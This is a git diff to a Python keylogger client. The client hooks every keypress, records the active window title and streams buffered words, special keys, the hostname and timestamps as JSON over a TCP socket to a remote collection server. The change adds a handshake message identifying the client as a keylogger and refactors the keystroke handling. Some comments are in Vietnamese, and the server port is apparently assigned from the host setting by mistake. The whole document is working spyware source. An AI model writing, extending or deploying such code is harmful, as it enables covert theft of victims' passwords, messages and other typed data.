@@ -23,17 +23,20 @@ class KeyloggerClient:
         self.server_port = server_config.SERVER_HOST
         self.view_id = socket.gethostname()
         self.sock = None
-
         self.word_buffer = ""
 
     def connect(self):
         try:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.sock.connect((self.server_host, self.server_port))
-            print(f"[+] Connected to {self.server_host}:{self.server_port}")
+
+            init_msg = json.dumps({"type": "keylogger"}) + "\n"
+            self.sock.sendall(init_msg.encode())
+
+            print("[+] Connected")
             return True
         except:
-            print("[!] Cannot connect. Retrying in 3s...")
+            print("[!] Retry in 3s...")
             time.sleep(3)
             return False
 
@@ -49,25 +52,21 @@ class KeyloggerClient:
                 "ViewID": self.view_id,
                 "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
-
-            data = json.dumps(msg) + "\n"
-            self.sock.sendall(data.encode())
+            self.sock.sendall((json.dumps(msg) + "\n").encode())
         except:
             self.sock = None
             self.ensure_connection()
 
     def flush_word_buffer(self):
-        """Gửi nguyên 1 từ khi người dùng ngừng gõ"""
         if self.word_buffer != "":
-            window_title = get_active_window_title()
-            self.send_keystroke(self.word_buffer, window_title)
+            self.send_keystroke(self.word_buffer, get_active_window_title())
             self.word_buffer = ""
 
     def on_press(self, key):
         try:
             window_title = get_active_window_title()
 
-            if hasattr(key, "char") and key.char is not None:
+            if hasattr(key, "char") and key.char:
                 if key.char.isalnum():
                     self.word_buffer += key.char
                 else:
@@ -75,23 +74,16 @@ class KeyloggerClient:
                     self.send_keystroke(key.char, window_title)
 
             else:
-                special_key = str(key)
+                self.flush_word_buffer()
 
                 if key == keyboard.Key.space:
-                    self.flush_word_buffer()
                     self.send_keystroke("[SPACE]", window_title)
-
                 elif key == keyboard.Key.enter:
-                    self.flush_word_buffer()
                     self.send_keystroke("[ENTER]", window_title)
-
                 elif key == keyboard.Key.backspace:
-                    self.flush_word_buffer()
                     self.send_keystroke("[BACKSPACE]", window_title)
-
                 else:
-                    self.flush_word_buffer()
-                    self.send_keystroke(special_key, window_title)
+                    self.send_keystroke(str(key), window_title)
 
         except Exception as e:
             print("[-] Error:", e)
